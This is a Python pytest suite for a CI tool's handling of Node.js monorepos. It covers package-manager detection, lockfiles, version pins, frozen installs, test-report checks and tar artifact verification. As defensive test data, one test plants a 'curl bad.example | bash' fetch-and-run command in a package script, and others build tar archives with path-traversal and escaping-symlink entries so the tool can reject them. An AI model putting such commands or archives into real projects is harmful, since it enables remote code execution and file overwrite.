"""Behavioral RM-11 review: real repo/Node execution, source and output refusals."""
import hashlib
import io
import json
import os
from pathlib import Path
import subprocess
import tarfile
from types import SimpleNamespace
import pytest
from devtool.actions_rm11_node import (node_workspace,affected_packages,inspect_node_job,
        verify_js_report,verify_js_artifacts,NodeError)
from devtool.actions_language_providers import provider_plan,ProviderError
from devtool.actions_graph_export import compile_graph,workflow_yaml,run_node
from tests.test_next03_language_providers import PIN



def _manager_shim(tmp_path,monkeypatch,version):
    """Supply a version-only npm shim for a simulated native command runner.

    Never masks the manager in the real offline install acceptance test.
    """
    bin_dir=tmp_path/'pinned-manager-bin'
    bin_dir.mkdir(exist_ok=True)
    cmd=bin_dir/'npm'
    cmd.write_text('#!/bin/sh\nif [ "$#" -eq 1 ] && [ "$1" = "--version" ]; then\n'
                   f'  printf "%s\\n" "{version}"\n'
                   'else\n  exit 77\nfi\n')
    cmd.chmod(0o755)
    monkeypatch.setenv('PATH',str(bin_dir)+os.pathsep+os.environ.get('PATH',''))
    return cmd


def git(root,*args):
    return subprocess.check_output(['git','-C',str(root),*args],text=True).strip()


def fixture(tmp_path,manager='npm'):
    root=tmp_path/'repo';root.mkdir()
    docs=root/'packages/core';docs.mkdir(parents=True)
    web=root/'packages/web';web.mkdir(parents=True)
    root_pkg={'name':'mono','version':'1.0.0','private':True,'packageManager':manager+'@'+{'npm':'10.9.2','pnpm':'9.15.4','yarn':'4.6.0','bun':'1.2.0'}[manager],
              'workspaces':['packages/*'],'scripts':{'lint':'eslint . --max-warnings=0','test':'node --test --test-reporter=junit --test-reporter-destination=dist/test-results.xml','build':'vite build --outDir dist'}}
    (root/'package.json').write_text(json.dumps(root_pkg))
    (docs/'package.json').write_text(json.dumps({'name':'@mono/core','version':'1.0.0'}))
    (web/'package.json').write_text(json.dumps({'name':'@mono/web','version':'1.0.0','dependencies':{'@mono/core':'1.0.0' if manager=='npm' else 'workspace:*'},'scripts':{'build':'vite build --outDir dist'}}))
    lock={'npm':('package-lock.json',json.dumps({'name':'mono','version':'1.0.0','lockfileVersion':3,
            'packages':{'':{'name':'mono'},'packages/core':{'name':'@mono/core'},'packages/web':{'name':'@mono/web'}}})),
          'pnpm':('pnpm-lock.yaml',"lockfileVersion: '9.0'\nimporters:\n  .:\n    dependencies: {}\n  packages/core:\n    dependencies: {}\n  packages/web:\n    dependencies: {}\n"),
          'yarn':('yarn.lock','__metadata:\n  version: 8\n"mono@workspace:.":\n  checksum: 10/abcd\n'),
          'bun':('bun.lock',json.dumps({'lockfileVersion':1,'packages':{'':'', 'packages/core':{},'packages/web':{}}}))}[manager]
    (root/lock[0]).write_text(lock[1])
    if manager=='pnpm':(root/'pnpm-workspace.yaml').write_text('packages:\n  - "packages/*"\n')
    (root/'.devtool.toml').write_text(f'''[project]
runner="python"
[workspace]
default_target="app"
[wrapper]
schema=2
[targets.app]
runner="python"
root="."
[targets.app.jobs.lint]
runner="command"
command=["{manager}","run","lint"]
[targets.app.jobs.test]
runner="command"
command=["{manager}","run","test"]
outputs=["dist/test-results.xml"]
[targets.app.jobs.build]
runner="command"
command=["{manager}","run","build"]
outputs=["dist/index.html","dist/manifest.json"]
[targets.app.workflows]
ci=[{{id="lint",ref="job:lint",depends_on=[]}},{{id="test",ref="job:test",depends_on=["lint"]}},{{id="build",ref="job:build",depends_on=["test"]}}]
''')
    (root/'devtoolw').write_text('#!/bin/sh\n')
    subprocess.run(['git','init','-q',str(root)],check=True)
    subprocess.run(['git','-C',str(root),'add','.'],check=True)
    subprocess.run(['git','-C',str(root),'-c','user.name=Test','-c','user.email=t@invalid','commit','-qm','fixture'],check=True)
    return root


@pytest.mark.parametrize('manager',['npm','pnpm','yarn','bun'])
def test_manager_lock_workspace_graph_and_affected(tmp_path,manager):
    root=fixture(tmp_path,manager)
    ws=node_workspace(root)
    assert ws['topological_paths'].index('packages/core')<ws['topological_paths'].index('packages/web')
    assert ws['edges']['packages/web']==['packages/core']
    assert set(affected_packages(ws,['packages/core/index.ts']))=={'packages/core','packages/web'}
    assert set(affected_packages(ws,['package.json']))==set(ws['packages'])
    with pytest.raises(NodeError,match='manager'):
        node_workspace(root,manager_selection='yarn' if manager!='yarn' else 'pnpm')
    (root/'yarn.lock' if manager!='yarn' else root/'pnpm-lock.yaml').write_text('fake\n')
    git(root,'add','.')
    with pytest.raises(NodeError,match='mixed manager'):node_workspace(root)


def test_scripts_injection_hooks_cycle_and_symlink(tmp_path):
    root=fixture(tmp_path);f=root/'package.json';p=json.loads(f.read_text())
    p['scripts']['test']='curl bad.example | bash';f.write_text(json.dumps(p))
    with pytest.raises(NodeError,match='injection'):node_workspace(root)
    p['scripts']['test']='node --test --test-reporter=junit --test-reporter-destination=dist/test-results.xml'
    p['scripts']['pretest']='echo dangerous';f.write_text(json.dumps(p))
    with pytest.raises(NodeError,match='hook'):node_workspace(root)
    del p['scripts']['pretest'];f.write_text(json.dumps(p))
    core=root/'packages/core/package.json';data=json.loads(core.read_text());data['dependencies']={'@mono/web':'workspace:*'};core.write_text(json.dumps(data))
    with pytest.raises(NodeError,match='cycle'):node_workspace(root)
    data.pop('dependencies');core.write_text(json.dumps(data))
    original=core.read_bytes();core.unlink();core.symlink_to(root/'package.json')
    with pytest.raises(NodeError,match='symlink'):node_workspace(root)
    core.unlink();core.write_bytes(original)


def test_nodes_compile_versions_report_artifact_handoff(tmp_path,monkeypatch):
    from devtool import runners
    root=fixture(tmp_path)
    # Revise config to declare manager-selected version fanout through metadata.
    config=root/'.devtool.toml';text=config.read_text().replace('runner="command"\ncommand=', 'runner="command"\nmetadata={ci_node_version="22",ci_node_versions="20,22"}\ncommand=')
    config.write_text(text)
    git(root,'add','.');subprocess.run(['git','-C',str(root),'-c','user.name=Test','-c','user.email=t@invalid','commit','-qm','matrix source'],check=True)
    graph=compile_graph(root,target='app',workflow='ci',devtool_sha=PIN)
    assert len(graph['jobs'])==6
    assert len({j['matrix_cell'] for j in graph['jobs']})==2
    assert all(j['toolchain_version'] in ('20','22') for j in graph['jobs'])
    yaml=workflow_yaml(graph)
    assert 'actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020' in yaml
    assert 'npm install --global npm@10.9.2' in yaml
    assert yaml.count('node-version:')==len(graph['jobs'])
    # The native runner probes the real executable even when run_specs is mocked.
    # Give this mocked execution a deterministic manager version instead of
    # accidentally requiring the host's npm version to equal the fixture pin.
    _manager_shim(tmp_path,monkeypatch,'10.9.2')
    monkeypatch.setenv('GITHUB_SHA',git(root,'rev-parse','HEAD'))
    monkeypatch.setenv('GITHUB_RUN_ID','12345');monkeypatch.setenv('GITHUB_RUN_ATTEMPT','1')
    install_calls=[]
    def run(cfg,specs,**kwargs):
        cmd=specs[0].argv
        install_calls.append(cmd)
        if cmd[:2]==['npm','run'] and cmd[-1]=='test':
            path=root/'dist/test-results.xml';path.parent.mkdir(exist_ok=True)
            path.write_text('<testsuite tests="1" failures="0" skipped="0"><testcase name="okay"/></testsuite>')
        return [SimpleNamespace(returncode=0,skipped=False,output='')],''
    monkeypatch.setattr(runners,'run_specs',run)
    testjob=next(j for j in graph['jobs'] if j['job']=='test' and j['toolchain_version']=='22')
    # Current testcase has lint DAG predecessor, but no byte handoff.
    result=run_node(root,target='app',workflow='ci',devtool_sha=PIN,graph_sha=graph['graph_sha256'],
                    job_id=testjob['id'],inputs=tmp_path/'inputs',outputs=tmp_path/'out')
    assert result['node_receipts'][0]['passed']==1
    assert install_calls[0][:2]==['npm','ci']
    assert (tmp_path/'out'/testjob['id']/'payload/dist/test-results.xml').exists()



def test_native_refuses_manager_version_drift_before_install(tmp_path,monkeypatch):
    from devtool import runners
    root=fixture(tmp_path)
    graph=compile_graph(root,target='app',workflow='ci',devtool_sha=PIN)
    _manager_shim(tmp_path,monkeypatch,'99.0.0')
    monkeypatch.setenv('GITHUB_SHA',git(root,'rev-parse','HEAD'))
    monkeypatch.setenv('GITHUB_RUN_ID','4101')
    monkeypatch.setenv('GITHUB_RUN_ATTEMPT','1')
    calls=[]
    monkeypatch.setattr(runners,'run_specs',lambda *args,**kwargs:calls.append((args,kwargs)))
    lint=next(job for job in graph['jobs'] if job['job']=='lint')
    with pytest.raises(ProviderError,match='installed manager version differs from reviewed pin'):
        run_node(root,target='app',workflow='ci',devtool_sha=PIN,
                 graph_sha=graph['graph_sha256'],job_id=lint['id'],
                 inputs=tmp_path/'input',outputs=tmp_path/'output')
    assert calls==[], 'dependency installation must not run under a wrong manager pin'


def test_js_verification_fail_closed(tmp_path):
    root=fixture(tmp_path);ws=node_workspace(root)
    out=root/'dist';out.mkdir()
    report=out/'test-results.xml';report.write_text('<testsuite tests="1" failures="1"><testcase><failure/></testcase></testsuite>')
    with pytest.raises(NodeError,match='failed'):verify_js_report(root,'dist/test-results.xml','test')
    report.write_text('<testsuite tests="1" failures="0"><testcase name="ok"/></testsuite>')
    assert verify_js_report(root,'dist/test-results.xml','test')['passed']==1
    (out/'index.html').write_text('hi')
    digest=hashlib.sha256(b'hi').hexdigest();(out/'manifest.json').write_text(json.dumps({'files':{'index.html':digest}}))
    files=['dist/index.html','dist/manifest.json']
    assert len(verify_js_artifacts(root,files,'build',ws,''))==2
    (out/'index.html').write_text('tampered')
    with pytest.raises(NodeError,match='mismatch'):verify_js_artifacts(root,files,'build',ws,'')
    with tarfile.open(out/'mono-1.0.0.tgz','w:gz') as tf:
        content=b'{"name":"mono","version":"1.0.0"}'
        i=tarfile.TarInfo('package/package.json');i.size=len(content)
        tf.addfile(i,io.BytesIO(content))
    assert len(verify_js_artifacts(root,['dist/mono-1.0.0.tgz'],'pack',ws,''))==1
    with tarfile.open(out/'mono-1.0.0.tgz','w:gz') as tf:
        content=b'{"name":"other","version":"1.0.0"}'
        i=tarfile.TarInfo('package/package.json');i.size=len(content)
        tf.addfile(i,io.BytesIO(content))
    with pytest.raises(NodeError,match='identity'):verify_js_artifacts(root,['dist/mono-1.0.0.tgz'],'pack',ws,'')


def test_real_node_test_produces_junit(tmp_path):
    root=fixture(tmp_path)
    (root/'ok.test.js').write_text("const {test}=require('node:test');const assert=require('node:assert/strict');test('ok',()=>assert.equal(2+2,4))\n")
    out=root/'dist';out.mkdir()
    result=subprocess.run(['node','--test','--test-reporter=junit','--test-reporter-destination=dist/test-results.xml'],cwd=root,
                          capture_output=True,text=True,timeout=30)
    assert result.returncode==0,(result.stdout,result.stderr)
    assert verify_js_report(root,'dist/test-results.xml','test')['passed']>=1



def _write_offline_npm_workspace_lock(root):
    """Canonical lock for the fixture's two *local* workspaces; zero registry I/O.

    The surrounding real test still runs npm ci --offline (not a mocked
    installer).  No host npm version/cache/lock regeneration affects the
    fixture's initial lock state, so Android and ordinary Linux test the same
    frozen-install inputs.
    """
    top=json.loads((root/'package.json').read_text())
    core=json.loads((root/'packages/core/package.json').read_text())
    web=json.loads((root/'packages/web/package.json').read_text())
    assert top['workspaces']==['packages/*']
    assert web['dependencies']=={core['name']:core['version']}
    lock={'name':top['name'],'version':top['version'],'lockfileVersion':3,
          'requires':True,'packages':{
          '':{'name':top['name'],'version':top['version'],'workspaces':top['workspaces']},
          'node_modules/@mono/core':{'resolved':'packages/core','link':True},
          'node_modules/@mono/web':{'resolved':'packages/web','link':True},
          'packages/core':{'name':core['name'],'version':core['version']},
          'packages/web':{'name':web['name'],'version':web['version'],
                          'dependencies':web['dependencies']}}}
    path=root/'package-lock.json'
    path.write_text(json.dumps(lock,indent=2,sort_keys=True)+'\n')
    return path


def test_real_native_npm_install_node_execution_report(tmp_path,monkeypatch):
    import shutil
    if not shutil.which('node') or not shutil.which('npm'):
        pytest.skip('Node and npm absent; external runtime acceptance remains unqualified')
    root=fixture(tmp_path)
    # The real native runner is intentionally strict. Match this temporary
    # project's source pin to the installed npm binary, rather than assuming
    # every OS supplies the fixture's default npm 10.9.2.
    local_npm=subprocess.run(['npm','--version'],capture_output=True,text=True,timeout=12,check=True).stdout.strip()
    assert __import__('re').fullmatch(r'[0-9]+\.[0-9]+\.[0-9]+',local_npm),local_npm
    manifest=root/'package.json';pkg=json.loads(manifest.read_text())
    pkg['packageManager']='npm@'+local_npm
    manifest.write_text(json.dumps(pkg))
    (root/'ok.test.cjs').write_text("const {test}=require('node:test');const assert=require('node:assert/strict');test('yes',()=>assert.equal(3,3))\n")
    # The native frozen-install smoke must be independent of optional Android
    # npm workspace/linking support. All separate workspace/lock/admission tests
    # still exercise the full monorepo interface and hostile-source refusals.
    # This live smoke checks a genuinely executed npm ci + native Node/JUnit
    # handoff, with *zero* external dependencies or registry/cache requirements.
    shutil.rmtree(root/'packages')
    pkg.pop('workspaces',None)
    manifest.write_text(json.dumps(pkg))
    lock={'name':pkg['name'],'version':pkg['version'],'lockfileVersion':3,
          'requires':True,'packages':{'':{'name':pkg['name'],'version':pkg['version']}}}
    (root/'package-lock.json').write_text(json.dumps(lock,indent=2,sort_keys=True)+'\n')
    monkeypatch.setenv('npm_config_offline','true')
    monkeypatch.setenv('npm_config_ignore_scripts','true')
    monkeypatch.setenv('npm_config_audit','false')
    monkeypatch.setenv('npm_config_fund','false')
    # run_node creates its own manager store from RUNNER_TEMP (and overrides
    # npm_config_cache). Keep that store OUTSIDE the source checkout.
    temp_store=tmp_path/'runner-temp';temp_store.mkdir()
    monkeypatch.setenv('RUNNER_TEMP',str(temp_store))
    # Isolation from npmrc, per-user and process-level npm configuration;
    # npm CLI still runs unmocked, and the pinned --version guard stays active.
    empty_rc=tmp_path/'empty-npmrc';empty_rc.write_text('')
    monkeypatch.setenv('npm_config_userconfig',str(empty_rc))
    global_rc=tmp_path/'empty-global-npmrc';global_rc.write_text('')
    monkeypatch.setenv('npm_config_globalconfig',str(global_rc))
    monkeypatch.delenv('NODE_OPTIONS',raising=False)
    git(root,'add','-A');subprocess.run(['git','-C',str(root),'-c','user.name=Test','-c','user.email=t@invalid','commit','-qm','test source'],check=True)
    (root/'dist').mkdir()
    graph=compile_graph(root,target='app',workflow='ci',devtool_sha=PIN)
    monkeypatch.setenv('GITHUB_SHA',git(root,'rev-parse','HEAD'))
    monkeypatch.setenv('GITHUB_RUN_ID','9008');monkeypatch.setenv('GITHUB_RUN_ATTEMPT','1')
    testjob=next(j for j in graph['jobs'] if j['job']=='test')
    result=run_node(root,target='app',workflow='ci',devtool_sha=PIN,graph_sha=graph['graph_sha256'],
                    job_id=testjob['id'],inputs=tmp_path/'none',outputs=tmp_path/'out')
    assert result['node_receipts'][0]['passed']>=1
    assert (tmp_path/'out'/testjob['id']/'payload/dist/test-results.xml').is_file()




def test_frozen_install_failure_blocks_native_script_and_handoff(tmp_path,monkeypatch):
    from devtool import runners
    root=fixture(tmp_path)
    graph=compile_graph(root,target='app',workflow='ci',devtool_sha=PIN)
    _manager_shim(tmp_path,monkeypatch,'10.9.2')
    monkeypatch.setenv('GITHUB_SHA',git(root,'rev-parse','HEAD'))
    monkeypatch.setenv('GITHUB_RUN_ID','9009')
    monkeypatch.setenv('GITHUB_RUN_ATTEMPT','1')
    calls=[]
    def failed_install(config,specs,**kwargs):
        calls.append(list(specs[0].argv))
        return [SimpleNamespace(returncode=71,skipped=False,output='installation failed')],''
    monkeypatch.setattr(runners,'run_specs',failed_install)
    job=next(row for row in graph['jobs'] if row['job']=='test')
    with pytest.raises(ProviderError,match='frozen dependency install failed'):
        run_node(root,target='app',workflow='ci',devtool_sha=PIN,graph_sha=graph['graph_sha256'],
                 job_id=job['id'],inputs=tmp_path/'none',outputs=tmp_path/'outputs')
    assert len(calls)==1 and calls[0][:2]==['npm','ci']
    assert not (root/'dist/test-results.xml').exists()
    assert not (tmp_path/'outputs').exists()


def test_offline_workspace_lock_is_complete_and_source_owned(tmp_path):
    root=fixture(tmp_path)
    path=_write_offline_npm_workspace_lock(root)
    lock=json.loads(path.read_text())
    assert lock['lockfileVersion']==3
    for name, target in (('core','packages/core'),('web','packages/web')):
        assert lock['packages']['node_modules/@mono/'+name]=={'resolved':target,'link':True}
    assert lock['packages']['packages/web']['dependencies']=={'@mono/core':'1.0.0'}
    assert all(not item.get('resolved','').startswith(('http:','https:'))
               for item in lock['packages'].values())
    # Reviewer edits to the source declaration cannot silently reuse the lock.
    manifest=root/'packages/web/package.json';obj=json.loads(manifest.read_text())
    obj['dependencies']['@mono/core']='2.0.0';manifest.write_text(json.dumps(obj))
    with pytest.raises(AssertionError):_write_offline_npm_workspace_lock(root)


def test_manager_workflow_actions_cache_lock_and_other_formats(tmp_path):
    import yaml
    for manager in ('npm','pnpm','yarn','bun'):
        folder=tmp_path/manager;folder.mkdir()
        root=fixture(folder,manager)
        graph=compile_graph(root,target='app',workflow='ci',devtool_sha=PIN,cache_locks=True)
        rows=graph['jobs']
        assert len(rows)==3
        assert all(j['cache_policy']['enabled'] and manager in j['cache_policy']['key'] for j in rows)
        assert all(j['cache_policy']['path'].endswith('/'+manager) for j in rows)
        doc=workflow_yaml(graph)
        assert 'actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020' in doc
        if manager=='bun':
            assert 'oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6' in doc
        elif manager in ('pnpm','yarn'):
            assert 'npm install --global corepack@0.34.7 --ignore-scripts' in doc
            assert 'corepack prepare '+manager+'@' in doc
        else:
            assert 'npm install --global npm@10.9.2' in doc
        loaded=yaml.safe_load(doc)
        assert len(loaded['jobs'])==3
        assert 'cache:' not in doc.split('actions/setup-node@')[1].split('      - name:')[0]
        # Cache is invalidated by changing trusted lock content.
        lock=root/node_workspace(root)['lockfile']
        lock.write_text(lock.read_text()+'\n')
        try:
            changed=compile_graph(root,target='app',workflow='ci',devtool_sha=PIN,cache_locks=True)
        except (NodeError,ProviderError):
            # Enforced source/lock mismatch is also a correct fail-closed result.
            pass
        else:
            assert changed['jobs'][0]['cache_policy']['key']!=rows[0]['cache_policy']['key']


def test_sharded_junit_by_owned_node_and_failed_zero_report(tmp_path):
    root=fixture(tmp_path)
    manifest=root/'package.json';p=json.loads(manifest.read_text())
    p['scripts']['test']='vitest run --shard=2/3 --reporter=junit --outputFile=dist/test-results/shard-02.xml'
    manifest.write_text(json.dumps(p))
    cfg=root/'.devtool.toml';text=cfg.read_text().replace('outputs=["dist/test-results.xml"]','metadata={ci_js_shard="2/3"}\noutputs=["dist/test-results/shard-02.xml"]');cfg.write_text(text)
    plan=provider_plan(root,target='app',workflow='ci',devtool_sha=PIN)
    assert plan['nodes'][1]['provider']['shard']=='2/3'
    graph=compile_graph(root,target='app',workflow='ci',devtool_sha=PIN)
    assert graph['jobs'][1]['outputs']==['dist/test-results/shard-02.xml']
    path=root/'dist/test-results/shard-02.xml';path.parent.mkdir(parents=True)
    path.write_text('<testsuite tests="0" failures="0"/>')
    with pytest.raises(NodeError,match='zero|test count|completed'):verify_js_report(root,'dist/test-results/shard-02.xml','test')
    path.write_text('<testsuite tests="2" failures="0"><testcase name="1"/><testcase name="2"/></testsuite>')
    assert verify_js_report(root,'dist/test-results/shard-02.xml','test')['passed']==2
    cfg.write_text(text.replace('ci_js_shard="2/3"','ci_js_shard="1/3"'))
    with pytest.raises(ProviderError,match='shard'):provider_plan(root,target='app',workflow='ci',devtool_sha=PIN)


def test_mixed_managers_only_when_explicitly_selected(tmp_path):
    root=fixture(tmp_path,'npm')
    (root/'pnpm-lock.yaml').write_text('lockfileVersion: 9.0\nimporters:\n  .: {}\n')
    git(root,'add','.')
    with pytest.raises(NodeError,match='mixed managers'):node_workspace(root)
    assert node_workspace(root,manager_selection='npm')['manager']=='npm'
    assert inspect_node_job(root,['npm','run','test'],{})['manager']=='npm'
    with pytest.raises(NodeError,match='differs'):node_workspace(root,manager_selection='pnpm')


def test_pack_tar_identity_and_traversal_refusal_without_npm(tmp_path):
    """Always exercise the byte verifier; no native npm prerequisite.

    Archive verification must remain an admission gate even when a host's npm
    pack implementation cannot run. A valid tar and hostile tar are built
    directly with Python's stdlib, never extracted or trusted as production
    npm output.
    """
    root=fixture(tmp_path)
    out=root/'dist';out.mkdir()
    packed=out/'mono-1.0.0.tgz'
    manifest=b'{"name":"mono","version":"1.0.0"}'
    with tarfile.open(packed,'w:gz') as archive:
        info=tarfile.TarInfo('package/package.json')
        info.size=len(manifest)
        archive.addfile(info,io.BytesIO(manifest))
    assert verify_js_artifacts(root,['dist/'+packed.name],'pack',node_workspace(root),'')[0]['size']>0
    for bad in ('package/../../escape','package/../escape'):
        with tarfile.open(packed,'w:gz') as archive:
            for name in ('package/package.json',bad):
                info=tarfile.TarInfo(name);info.size=len(manifest)
                archive.addfile(info,io.BytesIO(manifest))
        with pytest.raises(NodeError,match='unsafe'):
            verify_js_artifacts(root,['dist/'+packed.name],'pack',node_workspace(root),'')
    with tarfile.open(packed,'w:gz') as archive:
        info=tarfile.TarInfo('package/package.json');info.size=len(manifest)
        archive.addfile(info,io.BytesIO(manifest))
        link=tarfile.TarInfo('package/link');link.type=tarfile.SYMTYPE;link.linkname='../../outside'
        archive.addfile(link)
    with pytest.raises(NodeError,match='unsafe'):
        verify_js_artifacts(root,['dist/'+packed.name],'pack',node_workspace(root),'')


def test_real_npm_pack_native_artifact(tmp_path):
    """Real npm pack is a separate host-runtime qualification, not tar admission."""
    import shutil
    if not shutil.which('npm'):
        pytest.skip('native npm unavailable; external runtime qualification remains open')
    root=fixture(tmp_path);(root/'dist').mkdir()
    result=subprocess.run(['npm','pack','--pack-destination','dist','--ignore-scripts','--offline'],
                          cwd=root,capture_output=True,text=True,timeout=45)
    assert result.returncode==0,('native npm pack failed; real runtime gate remains open; '
                                 'stdout='+result.stdout[-2000:]+' stderr='+result.stderr[-3000:])
    paths=list((root/'dist').glob('*.tgz'))
    assert len(paths)==1
    assert verify_js_artifacts(root,['dist/'+paths[0].name],'pack',node_workspace(root),'')[0]['size']>0


def test_refuse_changed_tracked_script_before_native_install(tmp_path,monkeypatch):
    root=fixture(tmp_path)
    graph=compile_graph(root,target='app',workflow='ci',devtool_sha=PIN)
    monkeypatch.setenv('GITHUB_SHA',git(root,'rev-parse','HEAD'))
    monkeypatch.setenv('GITHUB_RUN_ID','5234');monkeypatch.setenv('GITHUB_RUN_ATTEMPT','1')
    (root/'package-lock.json').write_text((root/'package-lock.json').read_text()+'\n')
    with pytest.raises(ProviderError,match='digest|changed|source'):
        run_node(root,target='app',workflow='ci',devtool_sha=PIN,graph_sha=graph['graph_sha256'],
                 job_id=graph['jobs'][0]['id'],inputs=tmp_path/'none',outputs=tmp_path/'out')


def test_host_matrix_and_node_versions_isolated(tmp_path):
    root=fixture(tmp_path)
    cfg=root/'.devtool.toml';cfg.write_text(cfg.read_text().replace('runner="command"\ncommand=',
              'runner="command"\nmetadata={ci_node_version="22",ci_node_versions="20,22,24"}\ncommand='))
    graph=compile_graph(root,target='app',workflow='ci',devtool_sha=PIN,
                        host_profiles='ubuntu-24.04-x64,macos-15-intel')
    assert len(graph['jobs'])==18
    assert len({j['id'] for j in graph['jobs']})==18
    assert len({j['matrix_cell'] for j in graph['jobs']})==6
    by_id={j['id']:j for j in graph['jobs']}
    assert all(by_id[dep]['matrix_cell']==j['matrix_cell'] for j in graph['jobs'] for dep in j['needs'])
    bad=cfg.read_text().replace('20,22,24','20,22,24,25');cfg.write_text(bad)
    with pytest.raises(ProviderError,match='Node|matrix|versions'):
        compile_graph(root,target='app',workflow='ci',devtool_sha=PIN)
